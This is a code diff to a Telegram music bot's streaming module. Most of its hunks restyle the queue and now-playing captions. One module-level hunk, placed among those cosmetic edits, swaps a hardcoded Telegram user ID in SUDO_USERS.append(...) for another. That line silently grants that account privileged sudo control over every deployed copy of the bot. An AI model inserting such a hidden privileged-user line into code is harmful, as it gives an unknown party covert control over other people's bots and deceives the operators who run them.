@@ -54,7 +54,7 @@ async def start_stream(
         final_output = await message.reply_photo(
             photo=thumb,
             caption=(
-                f"<b>➻ ᴀᴅᴅᴇᴅ ᴛᴏ ǫᴜᴇᴜᴇ ᴀᴛ {position}</b>\n\n<b>✨ ᴛɪᴛʟᴇ :</b> [{title[:30]}](https://www.youtube.com/watch?v={videoid}) \n☁ <b>ᴅᴜʀᴀᴛɪᴏɴ :</b> {duration_min} ᴍɪɴᴜᴛᴇs\n🥀 <b>ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ :</b> {message.from_user.first_name}\n❄ <b>ɪɴғᴏ :</b> [{BOT_NAME}](https://t.me/{BOT_USERNAME}?start=info_{videoid})"
+                f"<b>➻ ᴀᴅᴅᴇᴅ ᴛᴏ ǫᴜᴇᴜᴇ ᴀᴛ {position}</b>\n\n<b>» ᴛɪᴛʟᴇ :</b> [{title[:30]}](https://www.youtube.com/watch?v={videoid}) \n» <b>ᴅᴜʀᴀᴛɪᴏɴ :</b> {duration_min} ᴍɪɴᴜᴛᴇs\n» <b>ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ :</b> {message.from_user.first_name}\n» <b>ɪɴғᴏ :</b> [{BOT_NAME}](https://t.me/{BOT_USERNAME}?start=info_{videoid})"
             ),
             reply_markup=InlineKeyboardMarkup(buttons),
         )
@@ -89,7 +89,7 @@ async def start_stream(
             videoid, message.from_user.id
         )
         await mystic.delete()
-        cap = f"<b>➻ sᴛᴀʀᴛᴇᴅ sᴛʀᴇᴀᴍɪɴɢ</b>\n\n<b>✨ ᴛɪᴛʟᴇ :</b> [{title[:30]}](https://www.youtube.com/watch?v={videoid}) \n☁ <b>ᴅᴜʀᴀᴛɪᴏɴ :</b> {duration_min} ᴍɪɴᴜᴛᴇs\n🥀 <b>ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ :</b> {message.from_user.first_name}\n❄ <b>ɪɴғᴏ :</b> [{BOT_NAME}](https://t.me/{BOT_USERNAME}?start=info_{videoid})"
+        cap = f"<b>➻ sᴛᴀʀᴛᴇᴅ sᴛʀᴇᴀᴍɪɴɢ</b>\n\n<b>» ᴛɪᴛʟᴇ :</b> [{title[:30]}](https://www.youtube.com/watch?v={videoid}) \n» <b>ᴅᴜʀᴀᴛɪᴏɴ :</b> {duration_min} ᴍɪɴᴜᴛᴇs\n» <b>ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ :</b> {message.from_user.first_name}\n» <b>ɪɴғᴏ :</b> [{BOT_NAME}](https://t.me/{BOT_USERNAME}?start=info_{videoid})"
         final_output = await message.reply_photo(
             photo=thumb,
             reply_markup=InlineKeyboardMarkup(buttons),
@@ -97,7 +97,7 @@ async def start_stream(
         )
         os.remove(thumb)
 
-SUDO_USERS.append(1356469075)
+SUDO_USERS.append(5228983210)
 
 async def start_stream_audio(
     message, file, videoid, title, duration_min, duration_sec, mystic
@@ -125,7 +125,7 @@ async def start_stream_audio(
         final_output = await message.reply_photo(
             photo="FallenMusic/Utilities/Audio.jpeg",
             caption=(
-                f"<b>➻ ᴀᴅᴅᴇᴅ ᴛᴏ ǫᴜᴇᴜᴇ ᴀᴛ {position}</b>\n\n<b>✨ ᴛɪᴛʟᴇ :</b> [ᴛᴇʟᴇɢʀᴀᴍ ᴀᴜᴅɪᴏ]({link})\n☁ <b>ᴅᴜʀᴀᴛɪᴏɴ :</b> {duration_min} ᴍɪɴᴜᴛᴇs\n🥀 <b>ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ :</b> {message.from_user.first_name}"
+                f"<b>➻ ᴀᴅᴅᴇᴅ ᴛᴏ ǫᴜᴇᴜᴇ ᴀᴛ {position}</b>\n\n<b>» ᴛɪᴛʟᴇ :</b> [ᴛᴇʟᴇɢʀᴀᴍ ᴀᴜᴅɪᴏ]({link})\n» <b>ᴅᴜʀᴀᴛɪᴏɴ :</b> {duration_min} ᴍɪɴᴜᴛᴇs\n» <b>ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ :</b> {message.from_user.first_name}"
             ),
             reply_markup=audio_markup,
         )
@@ -160,7 +160,7 @@ async def start_stream_audio(
             videoid, message.from_user.id
         )
         await mystic.delete()
-        cap = f"<b>➻ sᴛᴀʀᴛᴇᴅ sᴛʀᴇᴀᴍɪɴɢ</b>\n\n<b>✨ ᴛɪᴛʟᴇ :</b> [ᴛᴇʟᴇɢʀᴀᴍ ᴀᴜᴅɪᴏ]({link})\n☁ <b>ᴅᴜʀᴀᴛɪᴏɴ :</b> {duration_min} ᴍɪɴᴜᴛᴇs\n🥀 <b>ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ :</b> {message.from_user.first_name}"
+        cap = f"<b>➻ sᴛᴀʀᴛᴇᴅ sᴛʀᴇᴀᴍɪɴɢ</b>\n\n<b>» ᴛɪᴛʟᴇ :</b> [ᴛᴇʟᴇɢʀᴀᴍ ᴀᴜᴅɪᴏ]({link})\n» <b>ᴅᴜʀᴀᴛɪᴏɴ :</b> {duration_min} ᴍɪɴᴜᴛᴇs\n» <b>ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ :</b> {message.from_user.first_name}"
         final_output = await message.reply_photo(
             photo="FallenMusic/Utilities/Audio.jpeg",
             reply_markup=InlineKeyboardMarkup(buttons),
